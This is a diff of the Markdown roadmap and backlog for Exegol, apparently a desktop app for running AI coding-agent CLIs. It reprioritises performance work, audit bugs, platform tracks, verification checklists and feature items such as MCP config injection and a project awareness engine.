@@ -13,103 +13,38 @@
 
 ## Priority Order
 
-### Queue after 0.5.7 (2026-09-29)
+### Plan after 0.5.14 (2026-10-04)
 
-0. **T200 quick ones** (October competitor review): folder pre-trust, child env markers,
-   per-pane error boundary, orchestration skills, diff comments to the agent.
-1. **Verify opencode across app quit** (P1 #2 below).
-2. **Search follow-ups** (from the #151 simplify pass): `fsSearch`/`fsGrep` are sync napi calls
-   run per folder on the main process (fine at 3-10ms per repo, a freeze on a 30-repo workspace);
-   make them `AsyncTask` and give the Rust walker a nested-`.git` scope instead of the per-folder
-   loop. Unsaved edits are lost on rename of the open file (keep drafts in a store; the peek and
-   the Files viewer already ask before closing unsaved edits, #215).
-3. **Performance follow-ups** (0.5.3 audit, not done in the perf pass):
-   - `diff.gitState` every 15s per GitPane spawns 4 git + `gh pr view` (network): poll the PR on
-     its own 2-5 min interval and invalidate after push/commit; `diff.status` repeats its git status
-   - Polls keep running while the window is unfocused and hidden panes stay mounted: wire
-     TanStack `focusManager` to window blur/focus and `enabled: isVisible` on pane queries
-   - Main process: sync `emulator.snapshot()` per scrollback flush, `appendFileSync` per log line,
-     sync napi `getDiff`/`getWorktreeDiff` on polled paths, sync log scan in `tokens.scan`
-   - `FloatingBrowser` polls `agents.list` every 5s (shared key makes it win over 30s)
-5. **Audit leftovers (2026-09-28), not release blockers**:
-   - Git: Unstaged shows HEAD vs working tree (staged files appear twice); a file with staged and
-     unstaged changes lists only under Staged; renamed files pass `old -> new` as the path; Undo is
-     offered for `worktree_create` oplog entries the backend refuses; failed stage/unstage/create/
-     delete show no error
-   - Tokens: costs are fixed at import from a hardcoded price table (the Pricing editor changes
-     only one table); budgets cannot be deleted from the UI (`budgets.delete` unused)
-   - Watching: a card waiting for input cannot be collapsed. QA: saving a test does not refresh
-     the list. Tasks: auto-detect
-     never retries once the project loads; `.gitkeep` overwrite; GitHub issue cards drag to nothing
-   - Nits: Memory search ignores the category; prompts empty-state wording; tray "Show/Hide" label
-     stale; Parallel Runs promote has no error; `agentClis` settings field unused
-9. **Windows install commands, unverified**: `CLI_SETUP` has a `win` command per CLI taken from
-   each vendor's docs (2026-10-01), but Exegol ships no Windows build, so none has been run.
-   Before a Windows build: run each on Windows 11 (PowerShell vs cmd: `runCommandInNewTab`
-   types into the user's shell), confirm `commandOnPath` finds them (PATHEXT), and that Amp
-   (WSL only) shows its guide
-7. **Linux leftovers** (from the 2026-09-29 audit, after the first Linux build): ports
-   read with `lsof` only (use `ss -ltnp` + `/proc/<pid>/cwd` when missing); the tray is invisible
-   on stock GNOME (make sure no feature depends on it); rpm target for Fedora; the path guard
-   covers the macOS keychain folder but not `~/.local/share/keyrings`
-9. **React health score (react-doctor), keep raising it**: 54 → 70 so far (#204 Bugs, #205
-   Security/Performance, #209 Maintainability, Accessibility 88 → 2). Score 70; 22 findings left,
-   all in the known-and-kept list (TASK_COMPLETED/2609.md). Goal 90+. Measure with
-   `cd apps/desktop && npx -y react-doctor@0.9.14 . --yes --score`; the full list with `--json`.
-   CI job on PRs (changed scope): errors block, warnings are listed. Known limitation: a kept
-   finding re-appears as new when its lines move.
-   Rule: fix the root cause, never a disable, ignore or config entry to lift the number; a
-   finding that is wrong for this app stays listed and is noted in the PR (the score counts it).
-   - Known and kept (not bugs here): two `autoFocus` on editors the user just opened (rename,
-     diff comment), sequential loops that must stay so (queue spawns, reattach
-     order, Ollama indexer, auto-resume, the concurrency helper), Monaco already lazy, the PDF
-     iframe without `sandbox` (Chromium blocks its viewer), Doctor only shows install commands,
-     index keys where the position is the identity, two mutations with no cached data
+> Source: the 2026-10-04 backlog audit (`TASK_COMPLETED/2610.md`). User-facing and performance first.
 
+1. **Status bar usage** (T200.8): agents per CLI, Claude 5h / weekly plan usage with reset time,
+   Codex rate limits.
+2. **Performance pack 1**: T185.8 reattach replay; polls (T185.10: git status + `gh pr view`,
+   TanStack `focusManager` + `enabled: isVisible`, `FloatingBrowser` 5s); V8 compile cache
+   (`module.enableCompileCache()` in main and the sidecar, `COMPETITIVE_UPDATE_2026_10.md` P2).
+3. **Trust pack**: T200.1 folder pre-trust, T200.2 child env markers, T200.3 per-pane error
+   boundary, T183.2 AI features via the logged-in CLI.
+4. **Performance pack 2**: T185.19 main process off the hot path.
+5. **User features, one PR each**: T200.6 answer agent questions, T200.4 queue + steer, T200.5 undo
+   turn, T142 PR loop phase 1 (T200.7).
+6. **Daily bugs**: opencode dies across app quit (Verify live below), git pane renames / MM files /
+   silent failures (Audit leftovers below), T193.9 title trackers on reattach, T138 split modes,
+   T185.11 scheduler timeout, T193.2 execPath.
 
-> Source: the 2026-09-22 docs/board audit plus `RESEARCH/EXEGOL_REVIEW_2026_09_05.md`.
-> Goal: an installed build Antonio can use every day. Features wait.
-
-**P0**
-1. **Installable build**: DONE. 0.5.0 installed; v0.5.1 published on GitHub releases
-   (2026-09-24); 0.5.7 published: notarized since 0.5.4, Linux packages from CI since 0.5.6.
-   Still open: both manual-verification checklists below on the packaged app, and T195
-   (universal build) before sharing more widely.
-
-**P1**
-2. opencode TUI dies across app quit: VERIFY on 0.5.7 (reported 2026-08-11, before the two
-   likely causes changed on 2026-08-12: interactive CLIs now `exec` (no wrapper shell left behind)
-   and the MCP shim reconnects instead of exiting when the app quits). Launch opencode, quit
-   Exegol, reopen: the session should still be alive. If it dies, `exegol.log` says how
-3. Sidecar terminal correctness: T185.14 (rest: eviction of active rings), T185.8 (reattach replay)
-4. T181 purge UI + one retention policy (nothing is deleted any more; oplog keeps git trees)
-5. T183.2: AI features dark without an API key (Sparkles commit, scoring, evaluator)
-6. T185.11: scheduler timeout records two results and frees capacity early; T185.1 scheduler UI
-7. T185.6 / T185.7 / T185.9: main-process freezes (token scan, idle serialize, worktree status)
-8. T182.8: History pagination
-
-**P2 — Post-launch bets (next round):** T153 Awareness Engine · T133 remote channel (Telegram;
-remote continuity is the most visible gap vs Omnara / Claude web / Codex Remote) · T132 automations
-catalog (after T185.11) · T134 ACP experimental · T135 derived status + CDC · T136 tiered merge
-resolver · T137 hunk assignment + absorb · T138 ModeTracker · T139 skills security scan · T144
-dependency/library audit
+Then: T166 MCP recall via Ollama, T181 retention, T173, T175.4 claims TTL and UI, T144.
 
 > **Docs to review before Wave 3 design** (merged with PR #82, pending review — Antonio 2026-08-11):
 > `docs/ARCHITECTURE/COUNCIL_BASE.md` (council mode / structured executions — backs T188/T189)
-> + `docs/ARCHITECTURE/OWL_FLEET_WATCH.md` (fleet watch module — backs T186-T188, T159).
-
-### Shipped waves
-- **Wave 3: fleet + coordination (2026-08 to 2026-09)**: T149-T152, T155, T156, T157, T160, T161
-  (resume picker), T162 phases 1-2, T163 core, T166.1, T167, T168, T170.1, T172.1/5-7, T175.1, T176, T177, T178,
-  T179.3, T180, T181 core, T183.1 terminal fidelity, T184.1. Details: `docs/TASK_COMPLETED/2608.md`, `2609.md`.
-- **Wave 2 — Competitive Review (2026-07)**: T123-T131, T88v2, T140, T141, T143, T145-T148
-  across WT-A/B/C/D. Details: `docs/TASK_COMPLETED/2607.md`.
-
-- **Wave 1 — Stack Optimizations (Terax review, 2026-05)**: quick wins + WT1-WT5 + T120 settings window.
-  Details: `docs/TASK_COMPLETED/2605.md` · `docs/CHANGELOG.md` · analysis `docs/RESEARCH/TERAX_STACK_REVIEW.md`
-- Earlier waves (V1-V3, T01-T107): `docs/TASK_COMPLETED/2603.md`, `2604.md`, `docs/ARCHIVED/APPLIED/`
+> + `docs/ARCHITECTURE/OWL_FLEET_WATCH.md` (fleet watch module — backs T153 Owl phases, T188).
 
 ### Verify live (2026-09-29/30, not checked in the app)
+- **opencode TUI across app quit** (reported 2026-08-11, before the two likely causes changed on
+  2026-08-12: interactive CLIs now `exec` (no wrapper shell left behind) and the MCP shim
+  reconnects instead of exiting when the app quits). Launch opencode, quit Exegol, reopen: the
+  session should still be alive. If it dies, `exegol.log` says how. Seen then: the wrapper shell
+  survived in the sidecar but opencode exited with its `Continue: opencode -s ses_…` message,
+  while claude-code survived the same flow; resume_command (T101) + the session browser (T155.5)
+  are the recovery path
 - Sidebar tree: a layout tab lists browser, launcher and both shells; a shell running `bun dev`
   shows it and pulses, at the prompt it is still; the + menu fits near the bottom
 - Sidebar Projects auto order: Cmd+n ones first in key order, live ones next, then A-Z; the
@@ -131,19 +66,12 @@ dependency/library audit
   AppImage shows up in the app menu after its first launch and reopens from there; Settings >
   install CLI on the AppImage survives a restart; the .deb has its icon in the KDE menu and
   Discover shows a description, homepage and category
-- Close confirmation on Cmd+W, pane X, pane menu Close and tab close (Enter closes, Esc keeps);
-  unsaved edits in a Files pane or a terminal's Files peek are named
 - Terminal repaint after a hidden tab: leave a working Claude pane in another tab for a minute,
   come back: no overlapped lines (console shows "Output overflowed while hidden" when it
-  resynced). Cmd+V of a screenshot into Claude pastes its path
-- CLI updates: Restart to update after `claude update` (waits for the turn, Now, cancel);
-  Update opens a tab with the command; resume lands in the same pane for each CLI. Known limit:
-  CLIs without a stored resume id fall back to "continue last in this folder" (codex, opencode,
-  kilo, devin, agy...), which picks another session if two of the same CLI share the folder
+  resynced)
 - Startup CLI updates notice: shows once after load, Later remembers the versions, Update and
   restart waits for the install (15s checks) and then for each turn; a failed update leaves
   those sessions queued ("Restarts after the update", click to cancel)
-- Launcher: model field per CLI (claude sonnet/opus/haiku, a typed id for the rest), name field
 - **Linux keys** (built on macOS, needs a Linux run): Ctrl+Shift+N/T/W/D/B/J/K/P with the cursor
   in a terminal; Ctrl+Shift+1..0 and Ctrl+Shift+Alt+1..9; Ctrl+Shift+C / Ctrl+Shift+V in a
   terminal (V relies on Chromium's own paste); Ctrl+C/D/W still reach the shell; labels in the
@@ -152,18 +80,13 @@ dependency/library audit
   a focused floating terminal); Ctrl+Shift+W on Linux
 - Send to: only with a selection, agents only by project, paste without Enter, cursor lands there
 - Sidebar Agents / Needs attention switch; attention card in two rows; project Cmd+n badge
-- Watching pins as plain mirrors (fit opt-in per card)
 - Keyboard focus after Cmd+n / Cmd+Option+n; Ctrl+Tab and Cmd+] / Cmd+[ from inside a terminal
-- Trackpad scroll in Claude (and a mouse wheel at normal speed)
-- Shortcut slots from Edit project, Cmd+0, Reset Zoom on Cmd+Shift+0
 - Welcome tour (new user only), context menus near the window edges, Agents drop line, pane grip
-- Browser design/QA reports to live agents; Clear Terminal
-- Shell → agent promotion (a CLI typed in a terminal) + Continue
+- Browser design/QA reports to live agents
 - Accessibility structural changes: tab drag/rename (incl. the drop area now spread over the
   tab's controls), sidebar rows, dashboard card clicks
 - WebGL back after a terminal font change
 - Projects height handle in the sidebar
-- What's new dialog after a real update
 - Projects view (All Projects, sidebar +, Cmd+K Go to Projects): each card's icon and colour,
   running / waiting counts move with the agents, Cmd+n badge, group chip; Back and Esc return to
   the project or Dashboard it was opened from (Esc in the Add Project dialog only closes it)
@@ -171,79 +94,67 @@ dependency/library audit
 - Dashboard message thread on the agent card
 
 ### Manual verification pending (post-merge) `added: 2026-05-22`
-Wave 1+2 landed via 5 parallel WTs, T120 on top. Manual smoke-test recommended before broad release:
 - OSC 7 cwd badge on shell panes (open shell, `cd /tmp`, verify badge updates)
 - OSC 133 prompt boundaries (jump-to-previous-prompt should work)
 - Parallel agent comparator (spawn 2-3 agents on same task, verify columns + promote button)
-- Isolation badge states (isolated / pipeline / project-root / fallback)
-- [x] Stop-reason panel — VERIFIED 2026-07-09 (codex exit: overlay with Completed badge + "New agent with same task" + "View diff")
-- CSP changes (open DevTools console, verify zero CSP violations on basic flow)
-- Capability allowlist (no functional regression — all routers/IPC still callable from renderer)
-- **T120 settings window**: Cmd+, opens standalone; second Cmd+, focuses existing (no duplicate); Cmd+W closes settings only; main close also closes settings; minimize main keeps settings visible; theme change in settings reflects in main without reload
 
 ### Manual verification pending — Wave 2 `added: 2026-07-05`
-- [x] **T123 deterministic status — VERIFIED 2026-07-09** (live session, Antonio + Fable):
-  full cycle observed with real claude-code — `prompt_submit→turn_started/running`,
-  `tool_use→working`, `stop→finished/waiting_input`, ~1ms event→signal latency.
-  **Delivery finding**: the OSC-777→PTY path does NOT deliver (Claude Code captures hook
-  stdout; `/dev/tty` doesn't reach the PTY) — verification uncovered that the hook
-  **file-event channel** (`~/.exegol/events` → NotifyHandler) delivers perfectly but was
-  wired to a log-only stub; fixed in PR #63 (`dispatchAgentFileEvent` → signal pipeline,
-  with OSC-priority guard + terminal-status guard + 6 regression tests). File channel also
-  adds `prompt_submit` = turn-START boundary the OSC hook set never had (feeds T129).
-  Still pending below: attention signal (needs a permission-prompt scenario).
-  Optional follow-up (P3): debug OSC delivery or drop the OSC hooks in favor of file events.
-- Desktop notification on agent finished/failed + attention (with pending-question body)
 - Attention Inbox: TitleBar queue, Cmd+J jump, unread badges
 - Knowledge tab: opt-in setup (no files written on tab open), digest refresh, MEMORY.md sync/import
-- [x] Exegol MCP — **VERIFIED 2026-08-11**: shim framing bug found+fixed; claude shows
-  `exegol · connected · 3 tools`; live memory_search (empty-correct) → 3× memory_save
-  (ids+categories) → retrieval ✅. Pending only: read-mode denial (spawn a read-mode agent,
-  memory_save must be refused). **MCP HOST** (Exegol connecting to external servers: `mcp/host.ts`,
-  `registry.ts`, the `mcp.*` connect/tools procedures), kept on purpose (2026-09-29), not usable:
-  it never had a UI and nothing connects it; stdio frames with `Content-Length` (MCP stdio is
-  newline JSON, the shim's old bug), no `notifications/initialized` after `initialize`, protocol
-  pinned to 2024-11-05, no tests. `spawn-context` pastes `buildToolContext()` into agent prompts:
-  empty today, but harmful if a server were connected (agents cannot call tools outside their own
-  MCP config). Rebuild on `@modelcontextprotocol/sdk` when there is a real consumer (e.g. a
-  pipeline step calling a tool without an agent).
-  (`memory_list`, the AND→OR recall retry and opencode MCP config shipped: 2608.md, T163.)
-- Polish note (verify session): shell/agent exit card duplicates the scrollback tail
-  visible right below it — slim the AgentStopReason card (keep actions, drop/collapse tail)
-- Pipeline evidence: score badge + AI summary per step, Export Report
+- Exegol MCP read-mode denial: spawn a read-mode agent, memory_save must be refused (the rest of
+  the MCP loop was verified 2026-08-11)
 - Evaluator gate: template with gate step persists (zod fix), ship/retry routing works
 - Oplog v2: Turn Snapshots tab lists per-step snapshots; restore refuses cross-worktree
 - Race promote & clean: dirty loser prompts; live-agent loser refuses cleanup
-- Onboarding wizard on fresh profile: CLIs detected (packaged build especially — PATH fix)
 - Monitor → Resources: eviction actually drops RSS; budget alert fires once per period
-- **🐛 FOUND 2026-08-11 (verify on 0.5.7, see P1 #2): opencode TUI child dies across app quit** — the
-  wrapper shell survives in the sidecar (reattach OK, prompt shows `took 18m48s`) but the
-  opencode process exits, printing its `Continue: opencode -s ses_…` message; typing then
-  goes to the stale shell over a dead TUI screen. claude-code survives the identical flow.
-  Suspect: signal/EOF sensitivity difference in the TUI child when the app disconnects.
-  Recovery path exists by design: resume_command is captured (T101) → session browser
-  (T155.5) offers the resume. Mitigations shipped in verify session: Refresh Terminal
-  (repaint) + Open Terminal (dead panes).
 
-### P3 — Strategic bets / larger scope (post Wave 2)
-- **SSH Remote Development** (T73)
-- **CI/CD release pipeline** (T45): validation CI shipped (PR #115); release workflow pending
-- **Canary channel** (T46)
-- **Cross-repo workspaces** (T92) — front + back in one workspace (T146 project groups is the cheap precursor)
-- **Mobile companion app** (T93) — natural successor of T133 Telegram channel
-- **Headless daemon mode** (T94) — prerequisite for T93
-- **Panel Plugin SDK** (T97) — extensible panel system, v1.0 architecture (design spike first)
-- **Ephemeral validation containers** (T154) — run tests/evaluator checks in disposable Apple `container` VMs (NOT agent isolation)
-- **xterm renderer pool** (T114): measure first, T115 DormantRing and T178 hidden-pane byte cut already shipped
-- **Vercel AI SDK + Ollama** (T122) — value compounds with T130/T147 in-process LLM calls
-- **Issue tracker expansion** (T71) — Linear/Jira; plugs into T142 integrations registry
-- **T60 project hooks** — ⚠️ mostly superseded by shipped T91 (`.exegol/lifecycle.yaml`); pending delta only: `archive` hook on worktree archival + env vars — review & fold or drop
+### Audit leftovers (2026-09-28), not release blockers
+- Git: Unstaged shows HEAD vs working tree (staged files appear twice); a file with staged and
+  unstaged changes lists only under Staged; renamed files pass `old -> new` as the path; Undo is
+  offered for `worktree_create` oplog entries the backend refuses; failed stage/unstage/create/
+  delete show no error
+- Files: unsaved edits are lost on rename of the open file (keep drafts in a store; the peek and
+  the Files viewer already ask before closing unsaved edits, #215)
+- Watching: a card waiting for input cannot be collapsed. QA: saving a test does not refresh
+  the list. Tasks: auto-detect never retries once the project loads; `.gitkeep` overwrite;
+  GitHub issue cards drag to nothing
+- Nits: Memory search ignores the category; prompts empty-state wording; tray "Show/Hide" label
+  stale; Parallel Runs promote has no error
+- Moved: hardcoded token price table to T183.1, `budgets.delete` to T144, unused `agentClis` to
+  T185.16
+
+### Platform and health tracks
+- **Windows install commands, unverified**: `CLI_SETUP` has a `win` command per CLI taken from
+  each vendor's docs (2026-10-01), but Exegol ships no Windows build, so none has been run.
+  Before a Windows build: run each on Windows 11 (PowerShell vs cmd: `runCommandInNewTab`
+  types into the user's shell), confirm `commandOnPath` finds them (PATHEXT), and that Amp
+  (WSL only) shows its guide
+- **Linux leftovers** (from the 2026-09-29 audit, after the first Linux build): ports
+  read with `lsof` only (use `ss -ltnp` + `/proc/<pid>/cwd` when missing); the tray is invisible
+  on stock GNOME (make sure no feature depends on it); rpm target for Fedora; the path guard
+  covers the macOS keychain folder but not `~/.local/share/keyrings`
+- **React health score (react-doctor), keep raising it**: 54 → 70 so far (#204 Bugs, #205
+  Security/Performance, #209 Maintainability, Accessibility 88 → 2). Score 70; 22 findings left,
+  all in the known-and-kept list (TASK_COMPLETED/2609.md). Goal 90+. Measure with
+  `cd apps/desktop && npx -y react-doctor@0.9.14 . --yes --score`; the full list with `--json`.
+  CI job on PRs (changed scope): errors block, warnings are listed. Known limitation: a kept
+  finding re-appears as new when its lines move.
+  Rule: fix the root cause, never a disable, ignore or config entry to lift the number; a
+  finding that is wrong for this app stays listed and is noted in the PR (the score counts it).
+  - Known and kept (not bugs here): two `autoFocus` on editors the user just opened (rename,
+    diff comment), sequential loops that must stay so (queue spawns, reattach
+    order, Ollama indexer, auto-resume, the concurrency helper), Monaco already lazy, the PDF
+    iframe without `sandbox` (Chromium blocks its viewer), Doctor only shows install commands,
+    index keys where the position is the identity, two mutations with no cached data
 
 ---
 
 ## Active Backlog
 
-### T153 — Project Awareness Engine `added: 2026-07-07`
+### T153 — Project Awareness Engine `added: 2026-07-04`
+> Merged from T132 (automations catalog, `added: 2026-07-04`), T186 (Owl Phase 1), T187 (Owl
+> Phase 2) and T159 (embedded inference backend) on 2026-10-04. T153 itself was added 2026-07-07.
+
 **Priority**: P2 — **Wave 3 headline candidate** (do NOT start before Wave 2.6 exit criteria) | **Effort**: L (phased) | **Source**: original idea (Antonio) + design analysis 2026-07-07 + **reference implementation studies: `RESEARCH/CODEBASE_MEMORY_MCP_2026_07.md` + `RESEARCH/COCOINDEX_2026_08.md`** (adopt: two-tier mtime/hash freshness, logic fingerprint per collector, model-id in cache keys, ownership-based reconcile, macOS watcher-recreation loop, AST-derived FTS terms, source views for context packs; verdict: patterns yes, crate no) (adopt: index_coverage honesty table, FILE_CHANGES_WITH co-change drift, detect_changes hop-risk, source_hash caching, min-cosine multi-keyword recall; design spike must evaluate shelling out to the tool's CLI vs building file-level indexing in-house)
 
 **Why**
@@ -268,6 +179,14 @@ Wave 1+2 landed via 5 parallel WTs, T120 on top. Manual smoke-test recommended b
   plus our OSC/afterCommit hooks for intra-session reaction. Deliver via NotificationBus →
   **Project Health Inbox** (severity + confidence + mandatory evidence: file/line/fragment).
   Near-100% precision before any model opines.
+  - From T132: a template catalog over `scheduler/engine` ("daily summary", "scan vulns", "add
+    test coverage", "triage TODOs"), each run delivered via NotificationBus (T124) with empty
+    results suppressed, one-click enable from Project → Tasks. After T185.11.
+  - From T186 (Owl Phase 1, kills the manual "what have I not seen?" scan across active repos):
+    port the cli-proman collector commands (`status`, `git-status`, `wip`, `blocked`, `review`,
+    `next`...) as deterministic per-repo collectors → facts JSON; scheduler (interval/on-wake)
+    over registered repos (start: the maintainer's active repos); SQLite store with per-item
+    seen/unseen marks; raw digest view in the UI. Read-only toward repos, writes only its own store.
 - **Phase 2 — embedded local model**: per-file memory (purpose, exports, internal deps)
   for changed files only, 1-3 files per cycle → file_index → **context pack** injected at
   agent spawn. Schema (proven by codebase-memory-mcp): `qualified_name` stable key,
@@ -277,6 +196,14 @@ Wave 1+2 landed via 5 parallel WTs, T120 on top. Manual smoke-test recommended b
   budget; pause on high CPU/RAM/battery (resource monitor gates). Modes: Off / Light
   (deterministic only) / Balanced (1.7B) / Deep (4B+). Memory recall side-upgrade:
   **min-cosine multi-keyword** in `memory/store.ts` (all query terms must match, not average).
+  - From T187 (Owl Phase 2): turn the collector facts into notable-or-noise + priority + 1-2 line
+    summaries; seen items go quiet, unseen insist. The model only ever sees structured facts,
+    never raw diffs; every digest line carries verifiable facts (SHA, PR#, timestamp). Model
+    bake-off here (Qwen3 4B, SmolLM3-3B, Gemma 3 4B); `nomic-embed-text` stays embeddings-only.
+  - From T159: the runtime is the `llama-server` sidecar below, not an in-process backend (T159's
+    node-llama-cpp plan contradicted that decision and was dropped). Kept from it: GGUF download
+    management, a single-flight queue with priorities (interactive UI > background digest), a
+    ~2.5-3 GB RAM budget for 4B Q4, and backend swap as config, not rewrite.
 - **Phase 3 — semantic doc↔code drift** (README says 7-day expiry, sessionConfig uses 30):
   high confidence threshold, always "suggestion" until track record accumulates,
   `needs_human_review` flag.
@@ -323,64 +250,6 @@ Wave 1+2 landed via 5 parallel WTs, T120 on top. Manual smoke-test recommended b
 
 ---
 
-### T154 — Ephemeral Validation Containers `added: 2026-07-09`
-**Priority**: P3 — strategic bet (post Wave 3) | **Effort**: M-L | **Source**: idea (Antonio) + Apple `container` 1.0.0 (2026-06-09, 30k+ ⭐, WWDC26 "Container machine")
-
-**Why**
-- **Scope guard first**: this is NOT Sculptor-style agent-in-container isolation — the
-  competitive review explicitly rejected that (worktrees + accessModes cover 90% with 10%
-  of the friction; Docker-as-requirement kills onboarding). This is narrower and different:
-  **disposable validation sandboxes** — run tests, builds, and evaluator-gate checks away
-  from the main machine, in a throwaway environment.
-- The timing turned: Apple's native `container` hit 1.0.0 (June 2026) — VM-per-container
-  with sub-second boot, OCI images, zero Docker Desktop dependency, Swift/Apple Silicon
-  native. The "Container machine" feature (WWDC26) is exactly this use case: build/test a
-  project on Linux from macOS with directory mirroring.
-- **Killer internal use case**: parallel agents / race mode candidates running test suites
-  collide on ports, DBs, and dev servers. A disposable container per validation run removes
-  the whole conflict class — and makes evaluator gates (T88v2) stronger: "tests pass in a
-  clean room" is better evidence than "tests pass on the dev's hot machine".
-
-**Scope (design spike first)**
-- Runtime abstraction: Apple `container` CLI first (macOS 26 + Apple Silicon); detect-and-
-  degrade — feature hidden when unavailable; optional adapters later (colima/docker if present)
-- Per-project validation profile in `.exegol/lifecycle.yaml` (extends T91): image, setup
-  cmds, test cmd, resource caps
-- Integration points: evaluator gate step type "run validation container" (T88v2), Smart Git
-  Button pre-push check, race-mode comparator column (tests green per candidate), Health
-  Inbox signal on red
-- Worktree → container mount (readonly bind of the agent's worktree; results out via exit
-  code + captured output, stored as pipeline evidence T130)
-- Budget/cleanup: hard timeout per run, auto-remove on exit, cap concurrent containers via
-  resource monitor (T143)
-
-**Likely files**
-- New: `apps/desktop/src/main/validation/` (runtime adapter, profile loader, run manager)
-- `main/pipeline/evaluator-step-handler.ts` (gate integration), `lifecycle/loader.ts`
-  (profile), `GitPane/SmartGitAction.tsx` (pre-push check), `system/resources.ts` (caps)
-
----
-
-### T161 — Session naming ↔ CLI session identity `added: 2026-08-11` `updated: 2026-08-13`
-**Priority**: P2 | **Effort**: M | **Source**: Antonio, during the multi-agent rounds
-
-Shipped 2026-08-13: the spawn modal now offers this provider's resumable sessions ("New
-session" vs a codename chip with how long ago it ended) and a per-launch YOLO checkbox.
-`listResumable` carries the alias, so a session is picked by the name the user knew it by.
-
-Still open, and it is the interesting half: **claude and codex can NAME a session** (their
-own `rename` command) and resume it BY that name — `claude --resume "<name>"` opens it
-directly. Exegol currently keeps a separate identity (its codename) from the CLI's own, so
-after a restart the user renames by hand in each terminal to line them back up.
-
-Wanted: when Exegol assigns a codename, push it INTO the CLI's session name where the
-provider supports it, and prefer name-based resume over the captured resume command. One
-identity instead of two, and `agents_list` names then survive outside Exegol. Needs a
-per-provider capability (`supportsSessionRename`, `resumeByName`) rather than a special
-case; lands as a field of the T191 provider descriptor.
-
----
-
 ### T162 — Agent Links & Rooms `added: 2026-08-12`
 **Priority**: P1 (Wave 3) | **Effort**: M (phased) | **Source**: idea (Antonio 2026-08-12) + `ARCHITECTURE/COUNCIL_BASE.md` (exchange bus) + trinity human-gate patterns + **`RESEARCH/HERDR_2026_08.md` design requirements (2026-08-12): send-and-wait atomic (event cursor captured pre-write), `delivery_not_observed` error distinct from reply timeout, replies KEYED to message id + receiver-session pinning (never satisfied by a state transition or a successor session), reads never clear the human's seen-bit**
 
@@ -408,29 +277,12 @@ exchange-bus MVP only, no headless council executions. Absorbs:
 ---
 
 ### T163 — MCP Config Injection: all providers `added: 2026-08-12`
-**Priority**: P1 | **Effort**: S-M | **STATUS: core SHIPPED 2026-08-12** (PR #96 stale-shim proxy + PR #97 codex/opencode/gemini injection; devin + agy wired later, `exegol-mcp-config.ts:408-425`) — pending live verify + remaining CLIs: aider, goose, amp, kiro, kilocode, crush, factory-droid
+**Priority**: P1 | **Effort**: S-M | **STATUS: core SHIPPED 2026-08-12** (PR #96 stale-shim proxy + PR #97 codex/opencode/gemini injection; devin + agy wired later, `exegol-mcp-config.ts:408-425`). agy via plugins, the stale-shim gap and the Doctor wiring check are done (`TASK_COMPLETED/2610.md`, 2026-10-04 audit).
 
-- Today only claude-code gets `.mcp.json` → only claude agents can use agents_list /
-  agent_send / memory tools. Extend `mcp/exegol-mcp-config.ts` per provider:
-  codex (`~/.codex/config.toml` mcp_servers, or project `.codex/config.toml` — verify),
-  opencode (`opencode.json` mcp section), gemini (`.gemini/settings.json` mcpServers),
-  others per docs — each with the same shim command + per-agent token env, written at
-  spawn into the agent cwd, removed/revoked on exit. Doctor check: which providers have
-  MCP wiring available.
-- **agy (Antigravity) MCP = via PLUGINS (discovered 2026-08-12)**: the CLI has `/mcp` in
-  the TUI but config only via its plugin system — `agy plugin install <target>` with a
-  plugin dir containing `plugin.json` + `mcp_config.json` (standard mcpServers shape;
-  binary strings confirm). Plan: ship an "exegol" plugin scaffold (generated under
-  ~/.exegol/agy-plugin/) + idempotent `agy plugin install` at spawn; token via
-  mcp_config env if agy forwards it (validate live — codex-style sanitization possible,
-  shim cwd fallback as plan B). Until then agy is receive-only (PTY injection works).
-- **Stale-shim gap (live incident 2026-08-12)**: long-lived CLI sessions keep the shim
-  binary spawned at THEIR start — new tools (agent_send) are invisible until the session
-  restarts (juanito/paco couldn't message). Fix candidates: shim forwards a server-pushed
-  `notifications/tools/list_changed` (needs persistent socket + stdout notification), or
-  shim re-fetches tool defs from the server per tools/list instead of its bundled copy
-  (cheapest — defs already live server-side). Until then: new MCP tools require agent
-  session restart.
+- Pending: live verify of the injected configs per provider, and the remaining CLIs: aider,
+  goose, amp, kiro, kilocode, crush, factory-droid. Each gets the same shim command + per-agent
+  token env, written at spawn into the agent cwd, removed/revoked on exit (config writers table:
+  T191).
 
 ---
 
@@ -479,9 +331,7 @@ exchange-bus MVP only, no headless council executions. Absorbs:
 **Priority**: P1 unless noted | **Effort**: S-M each | **Source**: 2026-09-22 code audit + `RESEARCH/EXEGOL_REVIEW_2026_09_05.md` findings #3-#9. Items fixed in the same PR are in `TASK_COMPLETED/2609.md`.
 
 **Dead or missing surface**
-1. **Scheduler has no UI** since 274e611 (SchedulerSection deleted); the sidebar Schedulers section
-   was removed in the 2026-09-22 PR. Create/edit/toggle/run UI missing; hooks in
-   `renderer/hooks/use-trpc-scheduler.ts` unused.
+1. Scheduler UI: merged into 11 (one scheduler track).
 2. **Semantic code search (indexer), kept on purpose, not usable yet** (validated 2026-09-29):
    no UI and nothing triggers `indexer.startIndexing`, so `file_index`/`file_chunks` are empty for
    everyone; only the `exegol search` CLI reads them. Before exposing it (UI, an MCP `code_search`
@@ -492,7 +342,8 @@ exchange-bus MVP only, no headless council executions. Absorbs:
    grep must be shown first (agents already grep). The FTS index is separate and alive (memory
    recall); its `search.*` router has no caller (only memories are indexed)
 3. **Parallel runs**: `parallel-run:changed` broadcast is in neither the capabilities IPC list nor
-   preload (UI polls every 10s); `agents.cancelParallelRun` has no UI.
+   preload (UI polls every 10s); `agents.cancelParallelRun` has no UI. If every spawn fails the
+   run stays `running` forever (was T193.17, merged 2026-10-04).
 4. **Dead surface** (P2): `agent:signal` / `agent:turn-boundary` broadcasts have no subscriber;
    tables `sessions`, `port_registry`, `host_metrics` unused; `queue.*` has no UI. Wire or
    delete (feeds T144).
@@ -500,19 +351,33 @@ exchange-bus MVP only, no headless council executions. Absorbs:
    the paid Haiku call.
 
 **Main-process stalls**
-6. **Tokens tab Scan** (`tokens/log-parser.ts`) is sync `readFileSync` + `JSON.parse` over
-   `~/.claude/projects`: 2.1s freeze at ~1GB. Move to a worker_thread or stream with mtime skip.
-7. **Headless xterm serialize on main** (`headless-emulator.ts:69`), 25-40ms per 5000 lines: runs on
-   every 5s scrollback flush per agent even when idle (add a dirty flag), and twice per pane mount
-   (`use-terminal-lifecycle.ts` fetches a full snapshot to test non-empty, `terminal-setup.ts`
-   fetches again; the lifecycle hook's `markData` is unused and could be wired).
+6, 7, 9: merged into 19 (main process off the hot path).
